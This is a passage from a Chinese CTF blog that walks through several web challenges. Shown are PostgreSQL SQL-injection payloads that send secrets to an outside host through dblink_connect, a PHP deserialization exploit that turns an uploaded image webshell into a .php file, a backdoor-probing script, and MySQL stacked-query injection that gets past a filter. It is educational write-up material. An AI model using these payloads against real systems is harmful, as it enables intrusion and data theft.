<p>列出当前schema的table：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=&apos; || (SELECT string_agg(tablename, &apos;:&apos;) FROM pg_catalog.pg_tables WHERE schemaname=current_schema()) || &apos; password=postgres dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/06/13/5d01fd22325a750489.png" alt=""></p>
<p>列出searches的行数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=&apos; || (SELECT COUNT(*) FROM searches) || &apos; password=postgres dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
<p>发现为空，说明没有内容<br>由于<code>pg_read_file</code>不能用，我们可以使用<code>lo_import</code>将文件的内容加载到<code>pg_largeobject</code>目录中。如果查询成功，我们将获得对象的<code>oid</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=&apos; || (SELECT lo_import(&apos;/var/lib/postgresql/data/secret&apos;)) || &apos; password=postgres dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/06/13/5d0201e048b8e69600.png" alt=""><br>成功了！！！</p>
<p>每个文件都可以对应于一个oid<br>我们可以通过从pg_largeobject_metadata中提取来获取可用对象的oid列表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=&apos; || (SELECT string_agg(cast(l.oid as text), &apos;:&apos;) FROM pg_largeobject_metadata l) || &apos; password=postgres dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/06/13/5d0202849d7c926302.png" alt=""></p>
<p>我们尝试挨个读取，最终在<code>16444</code>读到了flag内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=&apos; || (SELECT convert_from(lo_get(16444), &apos;UTF8&apos;)) || &apos; password=postgres dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/06/13/5d0202971c8cd90441.png" alt=""></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/ctf/">ctf</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/06/06/CTF/qwb2019/"><span>qwbctf2019</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/06/06/CTF/qwb2019/" rel="bookmark">
        <time class="entry-date published" datetime="2019-06-06T03:02:00.572Z">
          2019-06-06
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="强网杯"><a href="#强网杯" class="headerlink" title="强网杯"></a>强网杯</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><h4 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h4><ul>
<li>网站功能：注册和登录，尝试注册一个账号，会出现一个上传页面，尝试上传</li>
<li>想到上传漏洞，疯狂fuzz，但是没卵用，于是老老实实上传了一个图片</li>
</ul>
<p><img src="https://i.loli.net/2019/06/02/5cf3ef419d83569270.png" alt=""></p>
<p>这个页面似乎没有什么特别之处，当出现未存在页面会跳转回<code>index.php/home.html</code>，这个时候普通扫描器存在弊端那就是他根据状态码来判断页面存在与否，所以我们可以利用<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a> ，于是找到了一个<code>www.tar.gz</code>，那就是源码泄露了</p>
<p>另一方面，观察cookie，似乎是base64，将其解码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:5:&#123;s:2:&quot;ID&quot;;i:4;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:5:&quot;email&quot;;s:7:&quot;a@a.com&quot;;s:8:&quot;password&quot;;s:32:&quot;0cc175b9c0f1b6a831c399e269772661&quot;;s:3:&quot;img&quot;;s:79:&quot;../upload/8af43a2068b1f60b959c6b26a1b566d0/f47454d1d3644127f42070181a8b9afc.png&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>熟悉的味道–<strong>反序列化</strong>，尝试直接利用，错了，于是审计代码</p>
<ul>
<li>定位到<code>/web/controller/</code>,有四个页面：<code>index</code>、<code>login</code>、<code>register</code>、<code>profile</code></li>
<li><code>index.php</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public function login_check()&#123;//登录检查</span><br><span class="line">    $profile=cookie(&apos;user&apos;);</span><br><span class="line">    if(!empty($profile))&#123;</span><br><span class="line">        $this-&gt;profile=unserialize(base64_decode($profile));//反序列化，漏洞点</span><br><span class="line">        $this-&gt;profile_db=db(&apos;user&apos;)-&gt;where(&quot;ID&quot;,intval($this-&gt;profile[&apos;ID&apos;]))-&gt;find();</span><br><span class="line">        if(array_diff($this-&gt;profile_db,$this-&gt;profile)==null)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>真正的重点：<code>profile.php</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\web\controller;</span><br><span class="line"></span><br><span class="line">use think\Controller;</span><br><span class="line"></span><br><span class="line">class Profile extends Controller</span><br><span class="line">&#123;</span><br><span class="line">    public $checker;</span><br><span class="line">    public $filename_tmp;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $upload_menu;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $img;</span><br><span class="line">    public $except;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;checker=new Index();</span><br><span class="line">        $this-&gt;upload_menu=md5($_SERVER[&apos;REMOTE_ADDR&apos;]);//目录创建方式</span><br><span class="line">        @chdir(&quot;../public/upload&quot;);</span><br><span class="line">        if(!is_dir($this-&gt;upload_menu))&#123;//判断是否已经存在</span><br><span class="line">            @mkdir($this-&gt;upload_menu);</span><br><span class="line">        &#125;</span><br><span class="line">        @chdir($this-&gt;upload_menu);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function upload_img()&#123;//跳转</span><br><span class="line">        if($this-&gt;checker)&#123;</span><br><span class="line">            if(!$this-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=&quot;http://&quot;.$_SERVER[&apos;HTTP_HOST&apos;].$_SERVER[&apos;SCRIPT_NAME&apos;].&quot;/index&quot;;</span><br><span class="line">                $this-&gt;redirect($curr_url,302);</span><br><span class="line">                exit();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!empty($_FILES))&#123;//创建file，利用md5加密，添加.png后缀</span><br><span class="line">            $this-&gt;filename_tmp=$_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">            $this-&gt;filename=md5($_FILES[&apos;upload_file&apos;][&apos;name&apos;]).&quot;.png&quot;;</span><br><span class="line">            $this-&gt;ext_check();//png检查</span><br><span class="line">        &#125;</span><br><span class="line">        if($this-&gt;ext) &#123;</span><br><span class="line">            if(getimagesize($this-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy($this-&gt;filename_tmp, $this-&gt;filename);//复制</span><br><span class="line">                @unlink($this-&gt;filename_tmp);//删除源文件</span><br><span class="line">                $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;</span><br><span class="line">                $this-&gt;update_img();</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $this-&gt;error(&apos;Forbidden type!&apos;, url(&apos;../index&apos;));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;error(&apos;Unknow file type!&apos;, url(&apos;../index&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function update_img()&#123;//检查用户</span><br><span class="line">        $user_info=db(&apos;user&apos;)-&gt;where(&quot;ID&quot;,$this-&gt;checker-&gt;profile[&apos;ID&apos;])-&gt;find();</span><br><span class="line">        if(empty($user_info[&apos;img&apos;]) &amp;&amp; $this-&gt;img)&#123;</span><br><span class="line">            if(db(&apos;user&apos;)-&gt;where(&apos;ID&apos;,$user_info[&apos;ID&apos;])-&gt;data([&quot;img&quot;=&gt;addslashes($this-&gt;img)])-&gt;update())&#123;</span><br><span class="line">                $this-&gt;update_cookie();</span><br><span class="line">                $this-&gt;success(&apos;Upload img successful!&apos;, url(&apos;../home&apos;));</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $this-&gt;error(&apos;Upload file failed!&apos;, url(&apos;../index&apos;));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function update_cookie()&#123;</span><br><span class="line">        $this-&gt;checker-&gt;profile[&apos;img&apos;]=$this-&gt;img;</span><br><span class="line">        cookie(&quot;user&quot;,base64_encode(serialize($this-&gt;checker-&gt;profile)),3600);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function ext_check()&#123;</span><br><span class="line">        $ext_arr=explode(&quot;.&quot;,$this-&gt;filename);</span><br><span class="line">        $this-&gt;ext=end($ext_arr);</span><br><span class="line">        if($this-&gt;ext==&quot;png&quot;)&#123;//判断文件是否为png文件</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        if($this-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>前导知识，php魔术方法，重载：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP所提供的重载（overloading）是指动态地创建类属性和方法。我们是通过魔术方法（magic methods）来实现的。</span><br><span class="line"></span><br><span class="line">当调用当前环境下未定义或不可见的类属性或方法时，重载方法会被调用。本节后面将使用不可访问属性（inaccessible properties）和不可访问方法（inaccessible methods）来称呼这些未定义或不可见的类属性或方法。</span><br><span class="line"></span><br><span class="line">所有的重载方法都必须被声明为 public</span><br></pre></td></tr></table></figure>
<ul>
<li><code>__get</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">读取不可访问属性的值时，__get() 会被调用。</span><br></pre></td></tr></table></figure>
<ul>
<li><code>__call</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在对象中调用一个不可访问方法时，__call() 会被调用。</span><br></pre></td></tr></table></figure>
<ul>
<li>关键利用点</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if($this-&gt;ext) &#123;</span><br><span class="line">            if(getimagesize($this-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy($this-&gt;filename_tmp, $this-&gt;filename);//复制</span><br><span class="line">                @unlink($this-&gt;filename_tmp);//删除源文件</span><br><span class="line">                $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;</span><br><span class="line">                $this-&gt;update_img();</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $this-&gt;error(&apos;Forbidden type!&apos;, url(&apos;../index&apos;));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;error(&apos;Unknow file type!&apos;, url(&apos;../index&apos;));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>上传一个shell，伪装为png，然后再重命名为php文件，那么就可以读取文件<br>我们可以直接通过<code>_GET</code>请求绕过如下判断：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(!empty($_FILES))&#123;</span><br><span class="line">    $this-&gt;filename_tmp=$_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">    $this-&gt;filename=md5($_FILES[&apos;upload_file&apos;][&apos;name&apos;]).&quot;.png&quot;;</span><br><span class="line">    $this-&gt;ext_check();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们的目的是要触发<code>uploa_image</code>方法，于是我们在<code>register.php</code>中看到:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public function __construct()</span><br><span class="line">   &#123;</span><br><span class="line">       $this-&gt;checker=new Index();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   public function __destruct()</span><br><span class="line">   &#123;</span><br><span class="line">       if(!$this-&gt;registed)&#123;</span><br><span class="line">           $this-&gt;checker-&gt;index();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p><strong>其 $this-&gt;registed、$this-&gt;checker 在反序列化时也是可控的。如果我们将 $this-&gt;checker 赋值为 Register 类，而 Register 类没有 index 方法，所以调用的时候就会触发 __call 方法，这样就形成了一条完整的攻击链</strong></p>
<p>就有了如下exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\web\controller;</span><br><span class="line">use think\Controller;</span><br><span class="line"></span><br><span class="line">class Register</span><br><span class="line">&#123;</span><br><span class="line">    public $checker;</span><br><span class="line">    public $registed = false;</span><br><span class="line">    public function __construct($checker)&#123;</span><br><span class="line">        $this-&gt;checker = $checker;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Profile</span><br><span class="line">&#123;   # 先上传一个图片马shell.png，保存路径为/upload/md5($_SERVER[&apos;REMOTE_ADDR&apos;])/md5($_FILES[&apos;upload_file&apos;][&apos;name&apos;]).&quot;.png&quot;</span><br><span class="line">    public $filename_tmp = &apos;./upload/af536bff8dbcf3875d093da49ba4e4ca/434a1f0621da555e5703d2bac3e4f357.png&apos;;</span><br><span class="line">    public $filename = &apos;./upload/af536bff8dbcf3875d093da49ba4e4ca/ct1.php&apos;;</span><br><span class="line">    public $ext = true;</span><br><span class="line">    public $except = array(&apos;index&apos; =&gt; &apos;upload_img&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$register = new Register(new Profile());</span><br><span class="line">echo urlencode(base64_encode(serialize($register)));</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注：shell由蚁剑生成，一句话不好连接</p>
</blockquote>
<h3 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h3><p><img src="https://www.zhaoj.in/wp-content/uploads/2019/05/1558835272fd70292e56dc92e7b063263780c6de81-1024x211.png" alt=""></p>
<p>下载源码，发现全是混淆过的：<br><img src="https://skysec.top/images/2019-05-25-15-35-59.png" alt=""></p>
<p><img src="https://skysec.top/images/706CA7490B0918EB26FE6AD941437F24.jpg" alt=""></p>
<p>既然为shell，我们尝试寻找<code>GET、post、assert、system</code>等可利用点，尝试<code>fuzz</code>的方法，将其中的参数复制为<code>echo &quot;fuck&quot;</code>，若成功则很可能为shell，利用多线程，提高效率：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import os,re</span><br><span class="line">import requests</span><br><span class="line">from multiprocessing import Pool</span><br><span class="line"></span><br><span class="line">filenames = os.listdir(&apos;C:\\MySoftwares\\php_develop\\WWW\\src&apos;)</span><br><span class="line">pattern = re.compile(r&quot;\$_[GEPOST]&#123;3,4&#125;\[.*\]&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def read_file(file):</span><br><span class="line">    for name in filenames:</span><br><span class="line">        print(name)</span><br><span class="line">        with open(&apos;C:\\MySoftwares\\php_develop\\WWW\\src\\&apos;+name,&apos;r&apos;) as f:</span><br><span class="line">            data = f.read()</span><br><span class="line">        result = list(set(pattern.findall(data)))</span><br><span class="line"></span><br><span class="line">        for ret in result:</span><br><span class="line">            try:</span><br><span class="line">                command = &apos;echo &quot;fuck&quot;&apos;</span><br><span class="line">                flag = &apos;fuck&apos;</span><br><span class="line">                # command = &apos;phpinfo();&apos;</span><br><span class="line">                # flag = &apos;phpinfo&apos;</span><br><span class="line">                if &apos;GET&apos; in ret:</span><br><span class="line">                    passwd = re.findall(r&quot;&apos;(.*)&apos;&quot;,ret)[0]</span><br><span class="line">                    r = requests.get(url=&apos;http://web15.buuoj.cn/&apos; + name + &apos;?&apos; + passwd + &apos;=&apos;+ command)</span><br><span class="line">                    if flag in r.text:</span><br><span class="line">                        print(&apos;backdoor file is: &apos; + name)</span><br><span class="line">                        print(&apos;GET:  &apos; + passwd)</span><br><span class="line">                # elif &apos;POST&apos; in ret:</span><br><span class="line">                #     passwd = re.findall(r&quot;&apos;(.*)&apos;&quot;,ret)[0]</span><br><span class="line">                #     r = requests.post(url=&apos;http://127.0.0.1:8888/&apos; + name,data=&#123;passwd:command&#125;)</span><br><span class="line">                #     if flag in r.text:</span><br><span class="line">                #         print(&apos;backdoor file is: &apos; + name)</span><br><span class="line">                #         print(&apos;POST:  &apos; + passwd)</span><br><span class="line">            except : pass</span><br><span class="line"></span><br><span class="line">def main(): </span><br><span class="line">    pool = Pool(processes=15)</span><br><span class="line">    for i in range(0,len(filenames),int(len(filenames)/15)):</span><br><span class="line">        pool.apply_async(read_file,(i+int(len(filenames)/15),))</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>跑了n年，最终找到了shell：<br><img src="https://i.loli.net/2019/06/06/5cf87c3996a8f98210.png" alt=""></p>
<p>然后在根目录找到flag，直接<code>cat /flag</code></p>
<h3 id="babywebbb"><a href="#babywebbb" class="headerlink" title="babywebbb"></a>babywebbb</h3><p>参考<a href="https://skysec.top/2019/05/25/2019-%E5%BC%BA%E7%BD%91%E6%9D%AFonline-Web-Writeup/#babywebbb" target="_blank" rel="noopener">飘零师傅的</a></p>
<h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><p>注意到<code>/?inject=1</code>，get方式传值</p>
<p>尝试<code>1&#39;</code>，报错</p>
<blockquote>
<p>error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’1’’’ at line 1</p>
</blockquote>
<p>大致猜测到闭合方式，尝试闭合<code>?inject=1&quot;%23</code>，返回：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>尝试<code>union select</code>返回：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure></p>
<p>尝试<code>?inject=1%27||1%23</code>列出了所有内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;2&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;miaomiaomiao&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(6) &quot;114514&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(2) &quot;ys&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以多语句查询<code>inject=0%27;show%20tables;%23</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以利用mysql预编译（prepare），prepare语法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MySQL prepare语法： </span><br><span class="line">PREPARE statement_name FROM preparable_SQL_statement; /*定义*/ </span><br><span class="line">EXECUTE statement_name [USING @var_name...]; /*执行预处理语句*/</span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE statement_name /*删除定义*/ ;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>PREPARE语句用于预备一个语句，并指定名称statement_name，以后引用该语句。语句名称对大小写不敏感。preparable_SQL_statement可以是一个文字字符串，也可以是一个包含了语句文本的用户变量。该文本必须表现为一个单一的SQL语句，而不是多个语句。在这语句里，‘?’字符可以被用于标识参数，当执行时，以指示数据值绑定到查询后。‘?’字符不应加引号，即使你想要把它们与字符串值结合在一起。参数标记只能用于数据值应该出现的地方，而不是SQL关键字，标识符，等等。<br>如果预语句已经存在，则在新的预语句被定义前，它会被隐含地删掉。</p>
</blockquote>
<p>构造如下语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set @sql=concat(&apos;sel&apos;,&apos;ect * from `1919810931114514`&apos;);</span><br><span class="line">prepare presql from @sql;</span><br><span class="line">execute presql;</span><br><span class="line">deallocate prepare presql;</span><br></pre></td></tr></table></figure></p>
<p>提示：</p>
<blockquote>
<p>strstr($inject, “set”) &amp;&amp; strstr($inject, “prepare”)</p>
</blockquote>
<p>strstr — 查找字符串的首次出现，区分大小写，所以改为大写</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=1%27;SET%20@sql=concat(%27sel%27,%27ect%20*%20from%20`1919810931114514`%27);%20PREPARE%20presql%20from%20@sql;%20execute%20presql;%20deallocate%20PREPARE%20presql;</span><br></pre></td></tr></table></figure>
<p>reference:<br><a href="https://skysec.top/2019/05/25/2019-强网杯online-Web-Writeup/" target="_blank" rel="noopener">https://skysec.top/2019/05/25/2019-强网杯online-Web-Writeup/</a><br><a href="https://xz.aliyun.com/t/5282" target="_blank" rel="noopener">https://xz.aliyun.com/t/5282</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
